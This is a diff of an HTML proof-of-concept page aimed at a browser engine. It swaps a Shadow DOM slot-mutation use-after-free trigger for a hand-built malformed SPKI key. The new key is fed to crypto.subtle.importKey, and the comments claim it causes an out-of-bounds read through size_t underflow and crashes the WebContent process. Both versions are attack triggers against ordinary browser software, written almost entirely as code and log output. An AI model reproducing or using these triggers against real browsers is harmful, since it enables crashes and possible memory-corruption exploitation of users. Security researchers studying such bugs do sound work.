@@ -11,44 +11,47 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== SLOTASSIGNMENT ITERATOR INVALIDATION ===", "info");
-log("[*] Building the Shadow DOM trap...", "info");
+log("=== SUBTLECRYPTO OUT-OF-BOUNDS READ ===", "info");
+log("[*] Forging a cursed SPKI key...", "info");
 
-let host = document.createElement('div');
-document.body.appendChild(host);
-let shadow = host.attachShadow({ mode: 'open' });
+// We are hand-crafting an SPKI payload to pass all the initial checks
+// and perfectly hit the missing bounds check at the very end.
+let keyData = new Uint8Array(19);
+keyData[0] = 0x30; // SEQUENCE
+keyData[1] = 0x00; // length=0
 
-// We need an initial slot and an assigned node to set up the state
-let slot1 = document.createElement('slot');
-slot1.name = 'slot_a';
-shadow.appendChild(slot1);
+// IdEcPublicKey (1.2.840.10045.2.1) -> 7 bytes
+keyData.set([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x02, 0x01], 2);
 
-let child = document.createElement('span');
-child.slot = 'slot_a';
-host.appendChild(child);
+// P-256 OID (1.2.840.10045.3.1.7) -> 8 bytes
+keyData.set([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x03, 0x01, 0x07], 9);
 
-log("[*] Initial state set. Now we force a mutation...", "info");
+keyData[17] = 0x00; // BIT STRING tag (or whatever is skipped)
+
+// THE DETONATOR
+keyData[18] = 0xFF; // bytesUsedToEncodedLength(0xFF) returns 128!
+// The C++ code will add 128 + 1 to the index, pushing it to 147.
+// The array is only 19 bytes long.
+// Then it calculates: keyData.size() - index  --> 19 - 147
+// This UNDERFLOWS a size_t, resulting in 18 Quintillion bytes!
+// It passes this massive size to the Apple Crypto library, which tries to read it.
+// BOOM!
+
+log("[!] Detonator set at byte 18. Importing key...", "warn");
+log("[!] Watch the WebContent process crash instantly...", "hit");
 
 setTimeout(() => {
-    log("[!] Triggering resolveSlotsAfterSlotMutation!", "warn");
-    log("[!] The C++ code will start iterating over m_slots...", "warn");
-    
-    // Adding a new slot triggers resolveSlotsAfterSlotMutation.
-    // While iterating, it calls hasAssignedNodes(), which calls assignSlots().
-    // assignSlots() MUTATES the m_slots map while it is being iterated!
-    // Result: Iterator invalidation -> Use-After-Free!
-    
-    let slot2 = document.createElement('slot');
-    slot2.name = 'slot_b';
-    
-    log("[*] Appending the second slot. Brace for impact...", "hit");
-    
-    try {
-        shadow.appendChild(slot2);
-        log("[-] If you see this, it survived (or the allocator masked the corruption).", "info");
-    } catch(e) {
-        log("[-] Error: " + e.message, "info");
-    }
+    crypto.subtle.importKey(
+        "spki", 
+        keyData, 
+        { name: "ECDSA", namedCurve: "P-256" }, 
+        true, 
+        ["verify"]
+    ).then(() => {
+        log("[-] Survived? The bounds check must be patched.", "info");
+    }).catch(e => {
+        log("[-] Caught error (might have been rejected gracefully): " + e.message, "info");
+    });
 }, 500);
 </script>
 </body>
